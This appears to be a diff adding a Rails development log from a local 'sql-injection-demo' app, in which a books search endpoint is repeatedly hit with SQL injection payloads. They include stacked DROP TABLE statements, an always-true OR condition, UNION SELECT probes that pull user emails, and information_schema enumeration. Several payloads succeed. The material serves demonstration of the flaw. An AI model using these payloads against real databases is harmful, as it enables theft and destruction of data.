+ActiveRecord::StatementInvalid (Mysql2::Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'DROP TABLE books;'##%'' at line 1: SELECT * FROM books WHERE title LIKE '%robert';DROP TABLE books;'##%'):
+  
+app/controllers/books_controller.rb:13:in `search'
+  Rendering /Users/james/.rbenv/versions/2.4.1/lib/ruby/gems/2.4.0/gems/actionpack-5.0.6/lib/action_dispatch/middleware/templates/rescues/diagnostics.html.erb within rescues/layout
+  Rendering /Users/james/.rbenv/versions/2.4.1/lib/ruby/gems/2.4.0/gems/actionpack-5.0.6/lib/action_dispatch/middleware/templates/rescues/_source.html.erb
+  Rendered /Users/james/.rbenv/versions/2.4.1/lib/ruby/gems/2.4.0/gems/actionpack-5.0.6/lib/action_dispatch/middleware/templates/rescues/_source.html.erb (2.8ms)
+  Rendering /Users/james/.rbenv/versions/2.4.1/lib/ruby/gems/2.4.0/gems/actionpack-5.0.6/lib/action_dispatch/middleware/templates/rescues/_trace.html.erb
+  Rendered /Users/james/.rbenv/versions/2.4.1/lib/ruby/gems/2.4.0/gems/actionpack-5.0.6/lib/action_dispatch/middleware/templates/rescues/_trace.html.erb (1.2ms)
+  Rendering /Users/james/.rbenv/versions/2.4.1/lib/ruby/gems/2.4.0/gems/actionpack-5.0.6/lib/action_dispatch/middleware/templates/rescues/_request_and_response.html.erb
+  Rendered /Users/james/.rbenv/versions/2.4.1/lib/ruby/gems/2.4.0/gems/actionpack-5.0.6/lib/action_dispatch/middleware/templates/rescues/_request_and_response.html.erb (0.5ms)
+  Rendered /Users/james/.rbenv/versions/2.4.1/lib/ruby/gems/2.4.0/gems/actionpack-5.0.6/lib/action_dispatch/middleware/templates/rescues/diagnostics.html.erb within rescues/layout (61.6ms)
+  [1m[36mBook Load (0.3ms)[0m  [1m[34mSELECT * FROM books WHERE title LIKE '%robert';DROP TABLE books;'##%'[0m
+  [1m[36mBook Load (0.4ms)[0m  [1m[34mSELECT * FROM books WHERE title LIKE '%robert';DROP TABLE books;'##%'[0m
+  [1m[36mBook Load (0.3ms)[0m  [1m[34mSELECT * FROM books WHERE title LIKE '%robert'; DROP TABLE books;'##%'[0m
+  [1m[36mBook Load (0.3ms)[0m  [1m[34mSELECT * FROM books WHERE title LIKE '%robert' DROP TABLE books;'##%'[0m
+Started GET "/books/search?keyword=%27+OR+%271%25%27+%3D+%271" for 127.0.0.1 at 2017-09-30 18:15:14 +0800
+Processing by BooksController#search as HTML
+  Parameters: {"keyword"=>"' OR '1%' = '1"}
+  [1m[36mBook Load (0.2ms)[0m  [1m[34mSELECT * FROM books WHERE title LIKE '%' OR '1%' = '1%'[0m
+  Rendering books/index.html.erb within layouts/application
+  Rendered books/index.html.erb within layouts/application (1.0ms)
+Completed 200 OK in 142ms (Views: 137.3ms | ActiveRecord: 0.9ms)
+
+
+Started GET "/books/search?keyword=robert%27%3BDROP+TABLE+books%3B--" for 127.0.0.1 at 2017-09-30 18:15:16 +0800
+Processing by BooksController#search as HTML
+  Parameters: {"keyword"=>"robert';DROP TABLE books;--"}
+  [1m[36mBook Load (0.3ms)[0m  [1m[34mSELECT * FROM books WHERE title LIKE '%robert';DROP TABLE books;--%'[0m
+Completed 500 Internal Server Error in 1ms (ActiveRecord: 0.3ms)
+
+
+  
+ActiveRecord::StatementInvalid (Mysql2::Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'DROP TABLE books;--%'' at line 1: SELECT * FROM books WHERE title LIKE '%robert';DROP TABLE books;--%'):
+  
+app/controllers/books_controller.rb:13:in `search'
+  Rendering /Users/james/.rbenv/versions/2.4.1/lib/ruby/gems/2.4.0/gems/actionpack-5.0.6/lib/action_dispatch/middleware/templates/rescues/diagnostics.html.erb within rescues/layout
+  Rendering /Users/james/.rbenv/versions/2.4.1/lib/ruby/gems/2.4.0/gems/actionpack-5.0.6/lib/action_dispatch/middleware/templates/rescues/_source.html.erb
+  Rendered /Users/james/.rbenv/versions/2.4.1/lib/ruby/gems/2.4.0/gems/actionpack-5.0.6/lib/action_dispatch/middleware/templates/rescues/_source.html.erb (2.3ms)
+  Rendering /Users/james/.rbenv/versions/2.4.1/lib/ruby/gems/2.4.0/gems/actionpack-5.0.6/lib/action_dispatch/middleware/templates/rescues/_trace.html.erb
+  Rendered /Users/james/.rbenv/versions/2.4.1/lib/ruby/gems/2.4.0/gems/actionpack-5.0.6/lib/action_dispatch/middleware/templates/rescues/_trace.html.erb (1.0ms)
+  Rendering /Users/james/.rbenv/versions/2.4.1/lib/ruby/gems/2.4.0/gems/actionpack-5.0.6/lib/action_dispatch/middleware/templates/rescues/_request_and_response.html.erb
+  Rendered /Users/james/.rbenv/versions/2.4.1/lib/ruby/gems/2.4.0/gems/actionpack-5.0.6/lib/action_dispatch/middleware/templates/rescues/_request_and_response.html.erb (0.5ms)
+  Rendered /Users/james/.rbenv/versions/2.4.1/lib/ruby/gems/2.4.0/gems/actionpack-5.0.6/lib/action_dispatch/middleware/templates/rescues/diagnostics.html.erb within rescues/layout (60.8ms)
+Started GET "/books/search?keyword=%27+OR+%271%25%27+%3D+%271" for 127.0.0.1 at 2017-09-30 18:18:07 +0800
+Started GET "/books/search?keyword=%27+OR+%271%25%27+%3D+%271" for 127.0.0.1 at 2017-09-30 18:18:07 +0800
+Processing by BooksController#search as HTML
+  Parameters: {"keyword"=>"' OR '1%' = '1"}
+  [1m[36mBook Load (0.4ms)[0m  [1m[34mSELECT * FROM books WHERE title LIKE '%' OR '1%' = '1%'[0m
+Processing by BooksController#search as HTML
+  Rendering books/index.html.erb within layouts/application
+  Parameters: {"keyword"=>"' OR '1%' = '1"}
+  Rendered books/index.html.erb within layouts/application (0.7ms)
+  [1m[36mBook Load (5.9ms)[0m  [1m[34mSELECT * FROM books WHERE title LIKE '%' OR '1%' = '1%'[0m
+Completed 200 OK in 14ms (Views: 12.9ms | ActiveRecord: 0.4ms)
+
+
+  Rendering books/index.html.erb within layouts/application
+  Rendered books/index.html.erb within layouts/application (0.5ms)
+Completed 200 OK in 44ms (Views: 34.6ms | ActiveRecord: 5.9ms)
+
+
+Started GET "/books/search?keyword=robert%27+UNION+SELECT+1%2C+name+FROM+users--" for 127.0.0.1 at 2017-09-30 18:18:08 +0800
+Processing by BooksController#search as HTML
+  Parameters: {"keyword"=>"robert' UNION SELECT 1, name FROM users--"}
+  [1m[36mBook Load (0.3ms)[0m  [1m[34mSELECT * FROM books WHERE title LIKE '%robert' UNION SELECT 1, name FROM users--%'[0m
+Completed 500 Internal Server Error in 1ms (ActiveRecord: 0.3ms)
+
+
+  
+ActiveRecord::StatementInvalid (Mysql2::Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '--%'' at line 1: SELECT * FROM books WHERE title LIKE '%robert' UNION SELECT 1, name FROM users--%'):
+  
+app/controllers/books_controller.rb:13:in `search'
+  Rendering /Users/james/.rbenv/versions/2.4.1/lib/ruby/gems/2.4.0/gems/actionpack-5.0.6/lib/action_dispatch/middleware/templates/rescues/diagnostics.html.erb within rescues/layout
+  Rendering /Users/james/.rbenv/versions/2.4.1/lib/ruby/gems/2.4.0/gems/actionpack-5.0.6/lib/action_dispatch/middleware/templates/rescues/_source.html.erb
+  Rendered /Users/james/.rbenv/versions/2.4.1/lib/ruby/gems/2.4.0/gems/actionpack-5.0.6/lib/action_dispatch/middleware/templates/rescues/_source.html.erb (2.5ms)
+  Rendering /Users/james/.rbenv/versions/2.4.1/lib/ruby/gems/2.4.0/gems/actionpack-5.0.6/lib/action_dispatch/middleware/templates/rescues/_trace.html.erb
+  Rendered /Users/james/.rbenv/versions/2.4.1/lib/ruby/gems/2.4.0/gems/actionpack-5.0.6/lib/action_dispatch/middleware/templates/rescues/_trace.html.erb (1.1ms)
+  Rendering /Users/james/.rbenv/versions/2.4.1/lib/ruby/gems/2.4.0/gems/actionpack-5.0.6/lib/action_dispatch/middleware/templates/rescues/_request_and_response.html.erb
+  Rendered /Users/james/.rbenv/versions/2.4.1/lib/ruby/gems/2.4.0/gems/actionpack-5.0.6/lib/action_dispatch/middleware/templates/rescues/_request_and_response.html.erb (0.5ms)
+  Rendered /Users/james/.rbenv/versions/2.4.1/lib/ruby/gems/2.4.0/gems/actionpack-5.0.6/lib/action_dispatch/middleware/templates/rescues/diagnostics.html.erb within rescues/layout (60.8ms)
+Started GET "/books/search?keyword=robert%25%27+UNION+SELECT+1%2C+name+FROM+users+--" for 127.0.0.1 at 2017-09-30 18:18:23 +0800
+Processing by BooksController#search as HTML
+  Parameters: {"keyword"=>"robert%' UNION SELECT 1, name FROM users --"}
+  [1m[36mBook Load (0.3ms)[0m  [1m[34mSELECT * FROM books WHERE title LIKE '%robert%' UNION SELECT 1, name FROM users --%'[0m
+Completed 500 Internal Server Error in 1ms (ActiveRecord: 0.3ms)
+
+
+  
+ActiveRecord::StatementInvalid (Mysql2::Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '--%'' at line 1: SELECT * FROM books WHERE title LIKE '%robert%' UNION SELECT 1, name FROM users --%'):
+  
+app/controllers/books_controller.rb:13:in `search'
+  Rendering /Users/james/.rbenv/versions/2.4.1/lib/ruby/gems/2.4.0/gems/actionpack-5.0.6/lib/action_dispatch/middleware/templates/rescues/diagnostics.html.erb within rescues/layout
+  Rendering /Users/james/.rbenv/versions/2.4.1/lib/ruby/gems/2.4.0/gems/actionpack-5.0.6/lib/action_dispatch/middleware/templates/rescues/_source.html.erb
+  Rendered /Users/james/.rbenv/versions/2.4.1/lib/ruby/gems/2.4.0/gems/actionpack-5.0.6/lib/action_dispatch/middleware/templates/rescues/_source.html.erb (2.4ms)
+  Rendering /Users/james/.rbenv/versions/2.4.1/lib/ruby/gems/2.4.0/gems/actionpack-5.0.6/lib/action_dispatch/middleware/templates/rescues/_trace.html.erb
+  Rendered /Users/james/.rbenv/versions/2.4.1/lib/ruby/gems/2.4.0/gems/actionpack-5.0.6/lib/action_dispatch/middleware/templates/rescues/_trace.html.erb (1.0ms)
+  Rendering /Users/james/.rbenv/versions/2.4.1/lib/ruby/gems/2.4.0/gems/actionpack-5.0.6/lib/action_dispatch/middleware/templates/rescues/_request_and_response.html.erb
+  Rendered /Users/james/.rbenv/versions/2.4.1/lib/ruby/gems/2.4.0/gems/actionpack-5.0.6/lib/action_dispatch/middleware/templates/rescues/_request_and_response.html.erb (0.4ms)
+  Rendered /Users/james/.rbenv/versions/2.4.1/lib/ruby/gems/2.4.0/gems/actionpack-5.0.6/lib/action_dispatch/middleware/templates/rescues/diagnostics.html.erb within rescues/layout (60.0ms)
+Started GET "/books/search?keyword=robert%27+UNION+SELECT+1%2C+name+FROM+users--" for 127.0.0.1 at 2017-09-30 18:18:35 +0800
+Processing by BooksController#search as HTML
+  Parameters: {"keyword"=>"robert' UNION SELECT 1, name FROM users--"}
+  [1m[36mBook Load (0.3ms)[0m  [1m[34mSELECT * FROM books WHERE title LIKE '%robert' UNION SELECT 1, name FROM users--%'[0m
+Completed 500 Internal Server Error in 1ms (ActiveRecord: 0.3ms)
+
+
+  
+ActiveRecord::StatementInvalid (Mysql2::Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '--%'' at line 1: SELECT * FROM books WHERE title LIKE '%robert' UNION SELECT 1, name FROM users--%'):
+  
+app/controllers/books_controller.rb:13:in `search'
+  Rendering /Users/james/.rbenv/versions/2.4.1/lib/ruby/gems/2.4.0/gems/actionpack-5.0.6/lib/action_dispatch/middleware/templates/rescues/diagnostics.html.erb within rescues/layout
+  Rendering /Users/james/.rbenv/versions/2.4.1/lib/ruby/gems/2.4.0/gems/actionpack-5.0.6/lib/action_dispatch/middleware/templates/rescues/_source.html.erb
+  Rendered /Users/james/.rbenv/versions/2.4.1/lib/ruby/gems/2.4.0/gems/actionpack-5.0.6/lib/action_dispatch/middleware/templates/rescues/_source.html.erb (2.7ms)
+  Rendering /Users/james/.rbenv/versions/2.4.1/lib/ruby/gems/2.4.0/gems/actionpack-5.0.6/lib/action_dispatch/middleware/templates/rescues/_trace.html.erb
+  Rendered /Users/james/.rbenv/versions/2.4.1/lib/ruby/gems/2.4.0/gems/actionpack-5.0.6/lib/action_dispatch/middleware/templates/rescues/_trace.html.erb (1.3ms)
+  Rendering /Users/james/.rbenv/versions/2.4.1/lib/ruby/gems/2.4.0/gems/actionpack-5.0.6/lib/action_dispatch/middleware/templates/rescues/_request_and_response.html.erb
+  Rendered /Users/james/.rbenv/versions/2.4.1/lib/ruby/gems/2.4.0/gems/actionpack-5.0.6/lib/action_dispatch/middleware/templates/rescues/_request_and_response.html.erb (0.5ms)
+  Rendered /Users/james/.rbenv/versions/2.4.1/lib/ruby/gems/2.4.0/gems/actionpack-5.0.6/lib/action_dispatch/middleware/templates/rescues/diagnostics.html.erb within rescues/layout (62.2ms)
+Started GET "/books/search?keyword=robert%25%27+UNION+SELECT+1%2C+name+FROM+users+--+" for 127.0.0.1 at 2017-09-30 18:19:45 +0800
+Processing by BooksController#search as HTML
+  Parameters: {"keyword"=>"robert%' UNION SELECT 1, name FROM users -- "}
+  [1m[36mBook Load (0.5ms)[0m  [1m[34mSELECT * FROM books WHERE title LIKE '%robert%' UNION SELECT 1, name FROM users -- %'[0m
+Completed 500 Internal Server Error in 1ms (ActiveRecord: 0.5ms)
+
+
+  
+ActiveRecord::StatementInvalid (Mysql2::Error: Table 'sql-injection-demo_development.users' doesn't exist: SELECT * FROM books WHERE title LIKE '%robert%' UNION SELECT 1, name FROM users -- %'):
+  
+app/controllers/books_controller.rb:13:in `search'
+  Rendering /Users/james/.rbenv/versions/2.4.1/lib/ruby/gems/2.4.0/gems/actionpack-5.0.6/lib/action_dispatch/middleware/templates/rescues/diagnostics.html.erb within rescues/layout
+  Rendering /Users/james/.rbenv/versions/2.4.1/lib/ruby/gems/2.4.0/gems/actionpack-5.0.6/lib/action_dispatch/middleware/templates/rescues/_source.html.erb
+  Rendered /Users/james/.rbenv/versions/2.4.1/lib/ruby/gems/2.4.0/gems/actionpack-5.0.6/lib/action_dispatch/middleware/templates/rescues/_source.html.erb (2.5ms)
+  Rendering /Users/james/.rbenv/versions/2.4.1/lib/ruby/gems/2.4.0/gems/actionpack-5.0.6/lib/action_dispatch/middleware/templates/rescues/_trace.html.erb
+  Rendered /Users/james/.rbenv/versions/2.4.1/lib/ruby/gems/2.4.0/gems/actionpack-5.0.6/lib/action_dispatch/middleware/templates/rescues/_trace.html.erb (1.1ms)
+  Rendering /Users/james/.rbenv/versions/2.4.1/lib/ruby/gems/2.4.0/gems/actionpack-5.0.6/lib/action_dispatch/middleware/templates/rescues/_request_and_response.html.erb
+  Rendered /Users/james/.rbenv/versions/2.4.1/lib/ruby/gems/2.4.0/gems/actionpack-5.0.6/lib/action_dispatch/middleware/templates/rescues/_request_and_response.html.erb (0.5ms)
+  Rendered /Users/james/.rbenv/versions/2.4.1/lib/ruby/gems/2.4.0/gems/actionpack-5.0.6/lib/action_dispatch/middleware/templates/rescues/diagnostics.html.erb within rescues/layout (68.1ms)
+  [1m[35m (0.2ms)[0m  [1m[34mSELECT DATABASE() as db[0m
+  [1m[35m (0.2ms)[0m  [1m[34mSELECT GET_LOCK('2346284283161265405', 0);[0m
+  [1m[36mActiveRecord::SchemaMigration Load (0.2ms)[0m  [1m[34mSELECT `schema_migrations`.* FROM `schema_migrations`[0m
+Migrating to CreateUsers (20170930102006)
+  [1m[35m (16.2ms)[0m  [1m[35mCREATE TABLE `users` (`id` int AUTO_INCREMENT PRIMARY KEY, `name` varchar(255), `email` varchar(255), `created_at` datetime NOT NULL, `updated_at` datetime NOT NULL) ENGINE=InnoDB[0m
+  [1m[35m (0.2ms)[0m  [1m[35mBEGIN[0m
+  [1m[35mSQL (0.2ms)[0m  [1m[32mINSERT INTO `schema_migrations` (`version`) VALUES ('20170930102006')[0m
+  [1m[35m (0.2ms)[0m  [1m[35mCOMMIT[0m
+  [1m[36mActiveRecord::InternalMetadata Load (0.2ms)[0m  [1m[34mSELECT  `ar_internal_metadata`.* FROM `ar_internal_metadata` WHERE `ar_internal_metadata`.`key` = 'environment' LIMIT 1[0m
+  [1m[35m (0.1ms)[0m  [1m[35mBEGIN[0m
+  [1m[35m (0.1ms)[0m  [1m[35mCOMMIT[0m
+  [1m[35m (0.2ms)[0m  [1m[34mSELECT RELEASE_LOCK('2346284283161265405')[0m
+  [1m[36mActiveRecord::SchemaMigration Load (0.3ms)[0m  [1m[34mSELECT `schema_migrations`.* FROM `schema_migrations`[0m
+  [1m[35m (0.2ms)[0m  [1m[35mSHOW CREATE TABLE `books`[0m
+  [1m[35m (0.3ms)[0m  [1m[35mSHOW TABLE STATUS LIKE 'books'[0m
+  [1m[35m (0.1ms)[0m  [1m[35mSHOW CREATE TABLE `users`[0m
+  [1m[35m (0.2ms)[0m  [1m[35mSHOW TABLE STATUS LIKE 'users'[0m
+Started GET "/books/search?keyword=robert%25%27+UNION+SELECT+1%2C+name+FROM+users+--+" for 127.0.0.1 at 2017-09-30 18:20:11 +0800
+  [1m[36mActiveRecord::SchemaMigration Load (0.2ms)[0m  [1m[34mSELECT `schema_migrations`.* FROM `schema_migrations`[0m
+Processing by BooksController#search as HTML
+  Parameters: {"keyword"=>"robert%' UNION SELECT 1, name FROM users -- "}
+  [1m[36mBook Load (0.5ms)[0m  [1m[34mSELECT * FROM books WHERE title LIKE '%robert%' UNION SELECT 1, name FROM users -- %'[0m
+Completed 500 Internal Server Error in 2ms (ActiveRecord: 0.5ms)
+
+
+  
+ActiveRecord::StatementInvalid (Mysql2::Error: The used SELECT statements have a different number of columns: SELECT * FROM books WHERE title LIKE '%robert%' UNION SELECT 1, name FROM users -- %'):
+  
+app/controllers/books_controller.rb:13:in `search'
+  Rendering /Users/james/.rbenv/versions/2.4.1/lib/ruby/gems/2.4.0/gems/actionpack-5.0.6/lib/action_dispatch/middleware/templates/rescues/diagnostics.html.erb within rescues/layout
+  Rendering /Users/james/.rbenv/versions/2.4.1/lib/ruby/gems/2.4.0/gems/actionpack-5.0.6/lib/action_dispatch/middleware/templates/rescues/_source.html.erb
+  Rendered /Users/james/.rbenv/versions/2.4.1/lib/ruby/gems/2.4.0/gems/actionpack-5.0.6/lib/action_dispatch/middleware/templates/rescues/_source.html.erb (7.3ms)
+  Rendering /Users/james/.rbenv/versions/2.4.1/lib/ruby/gems/2.4.0/gems/actionpack-5.0.6/lib/action_dispatch/middleware/templates/rescues/_trace.html.erb
+  Rendered /Users/james/.rbenv/versions/2.4.1/lib/ruby/gems/2.4.0/gems/actionpack-5.0.6/lib/action_dispatch/middleware/templates/rescues/_trace.html.erb (1.1ms)
+  Rendering /Users/james/.rbenv/versions/2.4.1/lib/ruby/gems/2.4.0/gems/actionpack-5.0.6/lib/action_dispatch/middleware/templates/rescues/_request_and_response.html.erb
+  Rendered /Users/james/.rbenv/versions/2.4.1/lib/ruby/gems/2.4.0/gems/actionpack-5.0.6/lib/action_dispatch/middleware/templates/rescues/_request_and_response.html.erb (0.5ms)
+  Rendered /Users/james/.rbenv/versions/2.4.1/lib/ruby/gems/2.4.0/gems/actionpack-5.0.6/lib/action_dispatch/middleware/templates/rescues/diagnostics.html.erb within rescues/layout (66.2ms)
+Started GET "/books/search?keyword=robert%25%27+UNION+SELECT+1%2C+email%2C+1%2C+1+FROM+users+--+" for 127.0.0.1 at 2017-09-30 18:20:54 +0800
+Processing by BooksController#search as HTML
+  Parameters: {"keyword"=>"robert%' UNION SELECT 1, email, 1, 1 FROM users -- "}
+  [1m[36mBook Load (0.4ms)[0m  [1m[34mSELECT * FROM books WHERE title LIKE '%robert%' UNION SELECT 1, email, 1, 1 FROM users -- %'[0m
+Completed 500 Internal Server Error in 1ms (ActiveRecord: 0.4ms)
+
+
+  
+ActiveRecord::StatementInvalid (Mysql2::Error: The used SELECT statements have a different number of columns: SELECT * FROM books WHERE title LIKE '%robert%' UNION SELECT 1, email, 1, 1 FROM users -- %'):
+  
+app/controllers/books_controller.rb:13:in `search'
+  Rendering /Users/james/.rbenv/versions/2.4.1/lib/ruby/gems/2.4.0/gems/actionpack-5.0.6/lib/action_dispatch/middleware/templates/rescues/diagnostics.html.erb within rescues/layout
+  Rendering /Users/james/.rbenv/versions/2.4.1/lib/ruby/gems/2.4.0/gems/actionpack-5.0.6/lib/action_dispatch/middleware/templates/rescues/_source.html.erb
+  Rendered /Users/james/.rbenv/versions/2.4.1/lib/ruby/gems/2.4.0/gems/actionpack-5.0.6/lib/action_dispatch/middleware/templates/rescues/_source.html.erb (3.5ms)
+  Rendering /Users/james/.rbenv/versions/2.4.1/lib/ruby/gems/2.4.0/gems/actionpack-5.0.6/lib/action_dispatch/middleware/templates/rescues/_trace.html.erb
+  Rendered /Users/james/.rbenv/versions/2.4.1/lib/ruby/gems/2.4.0/gems/actionpack-5.0.6/lib/action_dispatch/middleware/templates/rescues/_trace.html.erb (1.7ms)
+  Rendering /Users/james/.rbenv/versions/2.4.1/lib/ruby/gems/2.4.0/gems/actionpack-5.0.6/lib/action_dispatch/middleware/templates/rescues/_request_and_response.html.erb
+  Rendered /Users/james/.rbenv/versions/2.4.1/lib/ruby/gems/2.4.0/gems/actionpack-5.0.6/lib/action_dispatch/middleware/templates/rescues/_request_and_response.html.erb (0.5ms)
+  Rendered /Users/james/.rbenv/versions/2.4.1/lib/ruby/gems/2.4.0/gems/actionpack-5.0.6/lib/action_dispatch/middleware/templates/rescues/diagnostics.html.erb within rescues/layout (64.2ms)
+Started GET "/books/search?keyword=robert%25%27+UNION+SELECT+id%2C+email%2C+1%2C+1%2C+1+FROM+users+--+" for 127.0.0.1 at 2017-09-30 18:21:29 +0800
+Processing by BooksController#search as HTML
+  Parameters: {"keyword"=>"robert%' UNION SELECT id, email, 1, 1, 1 FROM users -- "}
+  [1m[36mBook Load (0.3ms)[0m  [1m[34mSELECT * FROM books WHERE title LIKE '%robert%' UNION SELECT id, email, 1, 1, 1 FROM users -- %'[0m
+  Rendering books/index.html.erb within layouts/application
+  Rendered books/index.html.erb within layouts/application (0.5ms)
+Completed 200 OK in 14ms (Views: 12.0ms | ActiveRecord: 0.6ms)
+
+
+Started GET "/books/search?keyword=non-exist-string%25%27+UNION+SELECT+id%2C+email%2C+1%2C+1%2C+1+FROM+users+--+" for 127.0.0.1 at 2017-09-30 18:21:45 +0800
+Processing by BooksController#search as HTML
+  Parameters: {"keyword"=>"non-exist-string%' UNION SELECT id, email, 1, 1, 1 FROM users -- "}
+  [1m[36mBook Load (0.2ms)[0m  [1m[34mSELECT * FROM books WHERE title LIKE '%non-exist-string%' UNION SELECT id, email, 1, 1, 1 FROM users -- %'[0m
+  Rendering books/index.html.erb within layouts/application
+  Rendered books/index.html.erb within layouts/application (0.4ms)
+Completed 200 OK in 14ms (Views: 12.8ms | ActiveRecord: 0.2ms)
+
+
+  [1m[36mActiveRecord::SchemaMigration Load (0.2ms)[0m  [1m[34mSELECT `schema_migrations`.* FROM `schema_migrations`[0m
+  [1m[36mActiveRecord::SchemaMigration Load (0.2ms)[0m  [1m[34mSELECT `schema_migrations`.* FROM `schema_migrations`[0m
+  [1m[35m (0.1ms)[0m  [1m[35mBEGIN[0m
+  [1m[35mSQL (0.3ms)[0m  [1m[32mINSERT INTO `users` (`name`, `email`, `created_at`, `updated_at`) VALUES ('James', 'james@gmail.com', '2017-09-30 10:22:59', '2017-09-30 10:22:59')[0m
+  [1m[35m (5.8ms)[0m  [1m[35mCOMMIT[0m
+  [1m[35m (0.2ms)[0m  [1m[35mBEGIN[0m
+  [1m[35mSQL (0.3ms)[0m  [1m[32mINSERT INTO `users` (`name`, `email`, `created_at`, `updated_at`) VALUES ('Ivy', 'john@gmail.com', '2017-09-30 10:22:59', '2017-09-30 10:22:59')[0m
+  [1m[35m (0.2ms)[0m  [1m[35mCOMMIT[0m
+Started GET "/books/search?keyword=non-exist-string%25%27+UNION+SELECT+id%2C+email%2C+1%2C+1%2C+1+FROM+users+--+" for 127.0.0.1 at 2017-09-30 18:23:05 +0800
+Processing by BooksController#search as HTML
+  Parameters: {"keyword"=>"non-exist-string%' UNION SELECT id, email, 1, 1, 1 FROM users -- "}
+  [1m[36mBook Load (0.3ms)[0m  [1m[34mSELECT * FROM books WHERE title LIKE '%non-exist-string%' UNION SELECT id, email, 1, 1, 1 FROM users -- %'[0m
+  Rendering books/index.html.erb within layouts/application
+  Rendered books/index.html.erb within layouts/application (0.9ms)
+Completed 200 OK in 19ms (Views: 16.0ms | ActiveRecord: 0.3ms)
+
+
+  [1m[36mBook Load (0.4ms)[0m  [1m[34mSELECT * FROM books; DROP Table users[0m
+  [1m[36mBook Load (0.3ms)[0m  [1m[34mSELECT * FROM books; DROP TABLE users[0m
+  [1m[36mBook Load (0.3ms)[0m  [1m[34mSELECT * FROM books; DROP Table users[0m
+  [1m[36mBook Load (0.2ms)[0m  [1m[34mSELECT * FROM books; DROP Table users[0m
+  [1m[36mBook Load (0.3ms)[0m  [1m[34mSELECT * FROM books; DROP Table users[0m
+  [1m[36mBook Load (0.5ms)[0m  [1m[34mSELECT * FROM books; DROP Table users[0m
+  [1m[35m (0.2ms)[0m  [1m[34mSELECT * FROM books; DROP Table users[0m
+Started GET "/books/search?keyword=non-exist-string%25%27+UNION+SELECT+1%2C+table_name%2C+1%2C+1%2C+1+FROM+information_schema.columns+--" for 127.0.0.1 at 2017-09-30 18:44:32 +0800
+Processing by BooksController#search as HTML
+  Parameters: {"keyword"=>"non-exist-string%' UNION SELECT 1, table_name, 1, 1, 1 FROM information_schema.columns --"}
+  [1m[36mBook Load (0.5ms)[0m  [1m[34mSELECT * FROM books WHERE title LIKE '%non-exist-string%' UNION SELECT 1, table_name, 1, 1, 1 FROM information_schema.columns --%'[0m
+Completed 500 Internal Server Error in 1ms (ActiveRecord: 0.5ms)
+
+
+  
+ActiveRecord::StatementInvalid (Mysql2::Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '--%'' at line 1: SELECT * FROM books WHERE title LIKE '%non-exist-string%' UNION SELECT 1, table_name, 1, 1, 1 FROM information_schema.columns --%'):
+  
+app/controllers/books_controller.rb:13:in `search'
+  Rendering /Users/james/.rbenv/versions/2.4.1/lib/ruby/gems/2.4.0/gems/actionpack-5.0.6/lib/action_dispatch/middleware/templates/rescues/diagnostics.html.erb within rescues/layout
+  Rendering /Users/james/.rbenv/versions/2.4.1/lib/ruby/gems/2.4.0/gems/actionpack-5.0.6/lib/action_dispatch/middleware/templates/rescues/_source.html.erb
+  Rendered /Users/james/.rbenv/versions/2.4.1/lib/ruby/gems/2.4.0/gems/actionpack-5.0.6/lib/action_dispatch/middleware/templates/rescues/_source.html.erb (2.3ms)
+  Rendering /Users/james/.rbenv/versions/2.4.1/lib/ruby/gems/2.4.0/gems/actionpack-5.0.6/lib/action_dispatch/middleware/templates/rescues/_trace.html.erb
+  Rendered /Users/james/.rbenv/versions/2.4.1/lib/ruby/gems/2.4.0/gems/actionpack-5.0.6/lib/action_dispatch/middleware/templates/rescues/_trace.html.erb (1.1ms)
+  Rendering /Users/james/.rbenv/versions/2.4.1/lib/ruby/gems/2.4.0/gems/actionpack-5.0.6/lib/action_dispatch/middleware/templates/rescues/_request_and_response.html.erb
+  Rendered /Users/james/.rbenv/versions/2.4.1/lib/ruby/gems/2.4.0/gems/actionpack-5.0.6/lib/action_dispatch/middleware/templates/rescues/_request_and_response.html.erb (0.6ms)
+  Rendered /Users/james/.rbenv/versions/2.4.1/lib/ruby/gems/2.4.0/gems/actionpack-5.0.6/lib/action_dispatch/middleware/templates/rescues/diagnostics.html.erb within rescues/layout (60.2ms)
+Started GET "/books/search?keyword=non-exist-string%25%27+UNION+SELECT+id%2C+email%2C+1%2C+1%2C+1+FROM+users+--+" for 127.0.0.1 at 2017-09-30 18:44:47 +0800
+Processing by BooksController#search as HTML
+  Parameters: {"keyword"=>"non-exist-string%' UNION SELECT id, email, 1, 1, 1 FROM users -- "}
+  [1m[36mBook Load (0.2ms)[0m  [1m[34mSELECT * FROM books WHERE title LIKE '%non-exist-string%' UNION SELECT id, email, 1, 1, 1 FROM users -- %'[0m
+  Rendering books/index.html.erb within layouts/application
+  Rendered books/index.html.erb within layouts/application (0.8ms)
+Completed 200 OK in 13ms (Views: 11.9ms | ActiveRecord: 0.2ms)
+
+
+Started GET "/books/search?keyword=non-exist-string%25%27+UNION+SELECT+1%2C+table_name%2C+1%2C+1%2C+1+FROM+information_schema.columns+--+" for 127.0.0.1 at 2017-09-30 18:44:48 +0800
+Processing by BooksController#search as HTML
+  Parameters: {"keyword"=>"non-exist-string%' UNION SELECT 1, table_name, 1, 1, 1 FROM information_schema.columns -- "}
+  [1m[36mBook Load (47.0ms)[0m  [1m[34mSELECT * FROM books WHERE title LIKE '%non-exist-string%' UNION SELECT 1, table_name, 1, 1, 1 FROM information_schema.columns -- %'[0m
+  Rendering books/index.html.erb within layouts/application
+  Rendered books/index.html.erb within layouts/application (33.5ms)
+Completed 200 OK in 96ms (Views: 45.1ms | ActiveRecord: 47.0ms)
+
+
+Started GET "/books/search?keyword=non-exist-string%25%27+UNION+SELECT+1%2C+table_name%2C+table_schema%2C+1%2C+1+FROM+information_schema.columns+--+" for 127.0.0.1 at 2017-09-30 18:45:22 +0800
+Processing by BooksController#search as HTML
+  Parameters: {"keyword"=>"non-exist-string%' UNION SELECT 1, table_name, table_schema, 1, 1 FROM information_schema.columns -- "}
+  [1m[36mBook Load (41.3ms)[0m  [1m[34mSELECT * FROM books WHERE title LIKE '%non-exist-string%' UNION SELECT 1, table_name, table_schema, 1, 1 FROM information_schema.columns -- %'[0m
+  Rendering books/index.html.erb within layouts/application
